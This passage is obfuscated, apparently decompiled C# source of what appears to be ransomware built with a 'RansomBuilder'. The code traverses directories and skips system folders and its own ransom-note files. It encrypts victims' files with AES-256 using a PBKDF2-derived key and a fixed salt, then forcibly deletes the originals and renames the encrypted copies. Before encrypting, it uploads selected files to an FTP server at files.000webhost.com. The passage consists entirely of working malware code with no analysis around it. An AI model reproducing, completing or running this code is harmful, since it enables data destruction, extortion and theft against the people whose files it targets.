					RWxKZhMehYiZ(CS_0024_003C_003E8__locals0.RIXsqLboma, CS_0024_003C_003E8__locals0.CJURxbYdTVz.yMFCuglUgJCVpAKQ, CS_0024_003C_003E8__locals0.CJURxbYdTVz.yZxCFvnahuDn, CS_0024_003C_003E8__locals0.CJURxbYdTVz.vbcNBZtJbT, CS_0024_003C_003E8__locals0.CJURxbYdTVz.bIslxlpGWGBq);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				RWxKZhMehYiZ(CS_0024_003C_003E8__locals0.RIXsqLboma, rlCSSwWkalJUFCD.yMFCuglUgJCVpAKQ, rlCSSwWkalJUFCD.yZxCFvnahuDn, rlCSSwWkalJUFCD.vbcNBZtJbT, rlCSSwWkalJUFCD.bIslxlpGWGBq);
			}
		}
	}

	public static void RWxKZhMehYiZ(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		if (!Directory.Exists(string_0))
		{
			return;
		}
		List<string> list = new List<string>();
		list = ((!(zedTTftlMRFGyyT == "YES")) ? vZihEfMvDeDT.SearchFiles(string_0) : gupSYRqpArl(string_0));
		foreach (string value in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value2 = string_3[num];
						if (!item.EndsWith(value2))
						{
							num++;
							continue;
						}
						goto IL_02e4;
					}
				}
				if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || hhOuBtBefBMgsY.Contains(item))
				{
					continue;
				}
				if (yyyqaCwLcXoW == "YES")
				{
					try
					{
						if (GQXZrsQLnuRE.xucSjyZphKA(item))
						{
							GQXZrsQLnuRE.BvuJZQdTHJj(item);
						}
					}
					catch
					{
					}
				}
				hhOuBtBefBMgsY.Add(item);
				if (!TIWMmpXrbrbQ.Contains(Path.GetDirectoryName(item)))
				{
					TIWMmpXrbrbQ.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (sVyPHvHEzbsPD == "YES" && fileStream.Length > Convert.ToInt32(mwdDsuOjNbyc) * 1024 * 1024)
					{
						if (GPXLlkBXabl == "YES")
						{
							foreach (string item2 in BPlmKsLHiLCGcx)
							{
								if (item.EndsWith(item2) && XzOLYKzyyKWdG == "YES" && Convert.ToInt32(OLVBwHKipWvp) * 1024 * 1024 > fileStream.Length)
								{
									try
									{
										LpcRwcYYzTjJT.YCTIRGAVPFhSUZb("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", item);
									}
									catch
									{
									}
								}
							}
						}
						byte[] byte_ = XcLYNPeJnYIi.kxPwDqCpdHgr(item, Convert.ToInt32(mwdDsuOjNbyc) * 1024 * 1024);
						byte[] byte_2 = XcLYNPeJnYIi.tGudVafmhSehm(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						XcLYNPeJnYIi.XUIINDUBVCEwlF(item, byte_2);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						isMXqpiiBmOd(item, item + string_2, KCxeudouKYw);
					}
					else
					{
						isMXqpiiBmOd(item, item + ".part", KCxeudouKYw);
					}
				}
				catch (Exception)
				{
				}
				IL_02e4:;
			}
		}
	}

	private static void isMXqpiiBmOd(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (GPXLlkBXabl == "YES")
					{
						foreach (string item in BPlmKsLHiLCGcx)
						{
							if (string_0.EndsWith(item) && XzOLYKzyyKWdG == "YES" && Convert.ToInt32(OLVBwHKipWvp) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									LpcRwcYYzTjJT.YCTIRGAVPFhSUZb("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", string_0);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
